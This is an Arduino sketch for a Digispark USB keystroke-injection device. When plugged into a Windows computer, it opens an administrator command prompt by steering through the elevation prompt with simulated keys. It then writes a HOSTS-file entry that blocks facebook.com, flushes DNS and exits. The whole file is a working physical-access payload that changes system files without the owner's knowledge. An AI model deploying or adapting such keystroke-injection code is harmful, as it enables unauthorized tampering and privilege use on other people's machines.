//Include library
#include <DigiKeyboard.h>

void setup() {
  //Minimize all windows
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  //This opens an administrator command prompt
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  //Code for entering commands into cmd
  DigiKeyboard.println("ECHO 0.0.0.0 facebook.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ipconfig /flushdns");
  //Closing cmd
  DigiKeyboard.println("exit");
}

void loop() {
}
